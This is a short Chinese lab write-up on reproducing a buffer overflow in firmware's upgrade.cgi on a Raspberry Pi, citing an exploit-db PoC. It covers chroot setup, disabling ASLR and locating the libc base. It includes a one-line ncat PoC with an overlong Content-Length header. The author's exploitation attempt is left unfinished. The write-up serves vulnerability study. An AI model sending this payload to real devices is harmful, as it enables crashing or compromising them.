漏洞poc: https://www.exploit-db.com/exploits/44001

主要参考这篇文章：https://xz.aliyun.com/t/5054

## raspberrypi下搭建

首先下好环境

漏洞固件和环境(感谢nop师傅)： https://pan.baidu.com/s/1l43s8MrRk1AiaDyuD4i5KQ 提取码：ke88

环境扔过去后，还是需要 mount 来挂载，然后 chroot 来执行

```
sudo mount -o bind /dev ./dev
sudo mount -t proc /proc ./proc
sudo chroot . ./usr/sbin/httpd
```

mount命令是挂载命令，将前一个文件夹挂在到后一个，这样访问后一个就相当于访问前一个

chroot命令用来在指定的根目录下运行指令。 chroot，即change root directory （更改root 目录）。 在linux 系统中，系统默认的目录结构都是以 / ，即是以根(root) 开始的。 而在使用chroot 之后，系统的目录结构将以指定的位置作为 / 位置。

遇见报 `chroot: failed to run command './usr/sbin/httpd' :  Permission denied ` 时，需要用 chmod -R 给 usr bin lib 文件夹都赋权限。

POC：

```
echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | ncat -v 192.168.43.159 80
```

## 调试

调试可以参考原文章

关闭 aslr 时遇见一个问题，修改不了 /proc/sys/kernel/randomize_va_space ，权限是-rw-r--r-- 1 root root 0 Oct 17 07:16 randomize_va_space，但是root和chmodt改不了，pi和root用户下用lsattr和chattr都会报错 chattr: Inappropriate ioctl for device while reading flags on randomize_va_space ，挂载情况是 proc on /proc type proc (rw,relatime)

但是很匪夷所思的一点是，经过不断的尝试， su 情况下 echo 0 > randomize_va_space 居然能写进去...

如果有师傅知道这里是为啥，还请告知：wu.guang.zheng@qq.com

需要注意的是，原文章中 cat /proc/2949/maps 查看 libc 基址时，中间的数字是进程的 PID ...吃了没技术的亏。


system死活复现不了...先睡觉，明天我试试用ida远程调
